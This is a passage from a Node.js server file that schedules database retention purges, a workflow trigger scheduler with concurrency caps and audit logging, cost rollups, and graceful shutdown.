    }, REAPER_INTERVAL_MS);
    reaperTimer.unref?.();
    const PURGE_INTERVAL_MS = 24 * 60 * 60 * 1000;
    const PURGE_AGE = process.env.VAULT_RAG_FLEET_RETENTION || '30 days';
    setInterval(async () => {
      try {
        // Drain in chunks of 10k to avoid one massive AccessExclusiveLock.
        let total = 0, limited = true, passes = 0;
        while (limited && passes < 100) {
          const r = await fleetDb.purgeOldEvents(pg, PURGE_AGE);
          total += r.deleted;
          limited = r.limited;
          passes += 1;
        }
        if (total) console.log(`[rag-api] fleet: purged ${total} events older than ${PURGE_AGE} (${passes} passes)`);
      } catch (e) {
        log.error('fleet_purge_failed', { msg: e.message });
      }
    }, PURGE_INTERVAL_MS).unref?.();

    // vt-0255: recycle-bin reaper. Soft-deleted groups/workflows older
    // than RECYCLE_RETAIN_DAYS get hard-deleted so the trash list stays
    // bounded. Default 30d; override via env. Runs once on boot (after
    // pg is bound) and then on the same 24h tick as fleet/tokmon purge.
    const RECYCLE_RETAIN_DAYS = parseInt(process.env.VAULT_RAG_RECYCLE_RETAIN_DAYS || '30', 10);
    const reapRecycle = async () => {
      try {
        const g = await pg.query(
          `DELETE FROM fleet_groups
            WHERE deleted_at IS NOT NULL
              AND deleted_at < now() - ($1 || ' days')::interval
            RETURNING id`, [String(RECYCLE_RETAIN_DAYS)]);
        const w = await pg.query(
          `DELETE FROM fleet_workflows
            WHERE deleted_at IS NOT NULL
              AND deleted_at < now() - ($1 || ' days')::interval
            RETURNING id`, [String(RECYCLE_RETAIN_DAYS)]);
        if (g.rowCount || w.rowCount) {
          console.log(`[rag-api] recycle-bin reaper: purged ${g.rowCount} groups + ${w.rowCount} workflows older than ${RECYCLE_RETAIN_DAYS}d`);
        }
      } catch (e) {
        log.error('recycle_reap_failed', { msg: e.message });
      }
    };
    setInterval(reapRecycle, PURGE_INTERVAL_MS).unref?.();
    setTimeout(reapRecycle, 30_000).unref?.();

    // vt-0296: daily cleanup of closed sessions. fleet_sessions has no
    // retention by default; closed rows accumulate forever unless an
    // operator manually hits /fleet/sessions/cleanup. 30 days matches
    // workflow/recycle retention. Drains in 1000-row batches.
    const CLOSED_SESSIONS_RETAIN = process.env.VAULT_RAG_CLOSED_SESSIONS_RETAIN || '30 days';
    const reapClosedSessions = async () => {
      try {
        let total = 0, limited = true, passes = 0;
        while (limited && passes < 50) {
          const r = await fleetDb.deleteClosedSessions(pg, CLOSED_SESSIONS_RETAIN);
          total += r.deleted;
          limited = r.limited;
          passes += 1;
        }
        if (total) log.info('closed_sessions_purged', { count: total, retain: CLOSED_SESSIONS_RETAIN, passes });
      } catch (e) {
        log.error('closed_sessions_purge_failed', { msg: e.message });
      }
    };
    setInterval(reapClosedSessions, PURGE_INTERVAL_MS).unref?.();
    setTimeout(reapClosedSessions, 45_000).unref?.();

    // vt-0110: workflow trigger scheduler. Scans fleet_workflows where
    // trigger is set; if `now - last_run_at >= every_ms`, kicks a new run.
    // Coarse 60s tick. every_ms minimum 60_000 (enforced at API layer).
    const wfDb = require('./lib/fleet-workflow-db');
    setInterval(async () => {
      try {
        const triggered = await wfDb.listTriggeredWorkflows(pg);
        if (!triggered.length) return;
        const now = Date.now();
        for (const w of triggered) {
          if (!w.trigger || typeof w.trigger.every_ms !== 'number') continue;
          const last = w.last_run_at ? new Date(w.last_run_at).getTime() : 0;
          if (now - last < w.trigger.every_ms) continue;
          // vt-0292: skip-fire if a run for this workflow is still active.
          // Without this guard a workflow that takes 5 min on a
          // every_ms=60000 trigger spawns 5 parallel runs and exhausts
          // the pg pool.
          if (w.has_active_run) {
            log.info('trigger_skip_active_run', { workflow_name: w.name });
            continue;
          }
          // vt-0318: global cross-workflow cap. Scheduler is bursty by
          // nature (cron-aligned), so we check here too — without it,
          // 20 different workflows on the same minute mark fire 20
          // parallel runs even if each is "only one of its kind".
          const WORKFLOW_MAX_CONCURRENT = parseInt(process.env.VAULT_RAG_WORKFLOW_MAX_CONCURRENT || '5', 10);
          let activeNow = 0;
          try { activeNow = await wfDb.countActiveRuns(pg); }
          catch (e) { log.warn('trigger_active_count_failed', { msg: e.message }); }
          if (activeNow >= WORKFLOW_MAX_CONCURRENT) {
            log.info('trigger_skip_cap', { workflow_name: w.name, active: activeNow, cap: WORKFLOW_MAX_CONCURRENT });
            // Don't break — next workflow's check might pass after this
            // one finishes; defer to next 60s tick.
            continue;
          }
          // Fire: create run + start the runner (same path as POST /workflows/:id/run).
          try {
            const run = await wfDb.createRun(pg, { workflowId: w.id, snapshot: w.definition });
            const runner = await fleetRoutes.ensureWorkflowRunner(fleetCtx);
            if (runner) runner.start(run.id);
            console.log(`[rag-api] trigger fired: workflow=${w.name} run=${run.id}`);
            // vt-0231: audit cron-fired runs. caller_id is 'cron' (not a
            // bearer hash) so the source is unambiguous in the audit table.
            try {
              const defSha = require('crypto').createHash('sha256').update(JSON.stringify(w.definition)).digest('hex');
              await pg.query(
                `INSERT INTO workflow_audit (op, workflow_id, run_id, caller_id, via, outcome, definition_sha)
                 VALUES ('run', $1, $2, 'cron', 'cron', 'ok', $3)`,
                [w.id, run.id, defSha]
              );
            } catch (e) { log.error('cron_audit_insert_failed', { workflow_id: w.id, run_id: run.id, msg: e.message }); }
          } catch (e) {
            log.error('trigger_fire_failed', { workflow_name: w.name, msg: e.message });
          }
        }
      } catch (e) {
        log.error('workflow_trigger_scan_failed', { msg: e.message });
      }
    }, 60 * 1000).unref?.();

    // vt-0114: daily cost rollup. Run BEFORE the tokmon retention purge
    // (so we don't lose rows we never aggregated). Tick every 6h —
    // covers UTC midnight in any operator timezone without leaning on
    // exact cron.
    const fleetCost = require('./lib/fleet-cost');
    setInterval(async () => {
      if (!fleetCtx.tokmonDb) return;
      try {
        // Aggregate yesterday + today — yesterday so it's complete, today
        // for partial-day visibility (rows get overwritten on next tick).
        for (const offset of [1, 0]) {
          const d = new Date(Date.now() - offset * 86400000);
          const dayStr = d.toISOString().slice(0, 10);
          const r = await fleetCost.aggregateDayRollup(fleetCtx.tokmonDb, pg, dayStr);
          if (r.rows) console.log(`[rag-api] cost rollup ${dayStr}: ${r.rows} rows`);
        }
      } catch (e) {
        log.error('cost_rollup_failed', { msg: e.message });
      }
    }, 6 * 60 * 60 * 1000).unref?.();
    // Run once at startup so a fresh deploy seeds yesterday's data without
    // waiting 6h for the first tick.
    setTimeout(async () => {
      if (!fleetCtx.tokmonDb) return;
      try {
        const yest = new Date(Date.now() - 86400000).toISOString().slice(0, 10);
        const r = await fleetCost.aggregateDayRollup(fleetCtx.tokmonDb, pg, yest);
        if (r.rows) console.log(`[rag-api] cost rollup ${yest}: ${r.rows} rows (startup)`);
      } catch (e) {
        log.error('cost_rollup_startup_failed', { msg: e.message });
      }
    }, 15_000).unref?.();

    // vt-0120: tokmon.events retention. Cost-event rows otherwise grow
    // forever; we keep N days of fine-grained data + the daily cost view
    // (computed on read, not pre-aggregated for now — see vt-0114 for the
    // rollup follow-up). Default 90 days; override via env.
    const TOKMON_RETAIN_DAYS = parseInt(process.env.VAULT_RAG_TOKMON_RETAIN_DAYS || '90', 10);
    setInterval(async () => {
      if (!fleetCtx.tokmonDb) return;
      try {
        let total = 0, limited = true, passes = 0;
        while (limited && passes < 20) {
          const { rowCount } = await fleetCtx.tokmonDb.query(
            `DELETE FROM events WHERE id IN (
               SELECT id FROM events
               WHERE ts < now() - ($1 || ' days')::interval
               LIMIT 50000
             )`, [String(TOKMON_RETAIN_DAYS)]);
          total += rowCount;
          limited = rowCount >= 50000;
          passes += 1;
        }
        if (total) console.log(`[rag-api] tokmon: purged ${total} events older than ${TOKMON_RETAIN_DAYS} days (${passes} passes)`);
      } catch (e) {
        log.error('tokmon_purge_failed', { msg: e.message });
      }
    }, 24 * 60 * 60 * 1000).unref?.();
  }
  server.listen(PORT, '0.0.0.0', () => {
    console.log(`[rag-api] listening on :${PORT} (vault=${VAULT}, pg=${SKIP_PG ? 'skipped' : `${PG.host}/${PG.database}`}, auth=Bearer)`);
  });
})().catch(e => {
  log.fatal('boot_fatal', { msg: e.stack || e.message });
  process.exit(1);
});

// vt-0212: graceful shutdown. The naive `server.close` left WS clients
// dangling (keeps the loop alive past close), pg connections orphaned,
// and any pending event-batcher writes lost on hub restart.
// vt-0233: enforce the 10s deadline via Promise.race — earlier shape
// would await batcher.flush() unconditionally and the deadline only
// padded the final sleep, never aborting a hung flush.
let _shuttingDown = false;
async function shutdown(signal) {
  if (_shuttingDown) {
    console.log(`[rag-api] already shutting down, ignoring ${signal}`);
    return;
  }
  _shuttingDown = true;
  console.log(`[rag-api] ${signal} received — graceful shutdown`);
  const DEADLINE_MS = 10_000;
  const doShutdown = async () => {
    server.closeIdleConnections?.();
    server.close((err) => {
      if (err) log.error('server_close_error', { msg: err.message });
    });
    try {
      const wss = server._fleetWss;
      if (wss) for (const ws of wss.clients) {
        try { ws.close(1001, 'shutdown'); } catch {}
      }
    } catch (e) { log.error('ws_drain_error', { msg: e.message }); }
    try { await fleetCtx?.batcher?.flush?.(); }
    catch (e) { log.error('batcher_flush_error', { msg: e.message }); }
    await cleanup();
  };
  const deadline = new Promise(r => setTimeout(r, DEADLINE_MS));
  let exitCode = 0;
  try {
    const winner = await Promise.race([
      doShutdown().then(() => 'clean'),
      deadline.then(() => 'deadline'),
    ]);
    if (winner === 'deadline') {
      log.error('shutdown_deadline', { msg: 'forcing exit after deadline' });
      exitCode = 1;
    }
  } catch (e) {
    log.error('shutdown_error', { msg: e.message });
    exitCode = 1;
  }
  process.exit(exitCode);
}
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT',  () => shutdown('SIGINT'));

// vt-0141 prereq: export `server` so tests can read .address().port and call
// .close(). Requires PORT=0 + VAULT_SECRETS_SKIP_PG=1 + test-pg env to be
// set BEFORE require. cleanup() ends the lazy pg + tokmon clients so the
// node:test event loop can exit. See scripts/lib/rag-api-test-helpers.js.
async function cleanup() {
  // vt-0186: fleetCtx.db is the SAME Pool object as `pg`; end() it once.
  if (fleetCtx?.tokmonDb) { try { await fleetCtx.tokmonDb.end(); } catch {} fleetCtx.tokmonDb = null; }
  if (fleetCtx) fleetCtx.db = null;
  if (pg) { try { await pg.end(); } catch {} pg = null; }
}
module.exports = { server, cleanup };
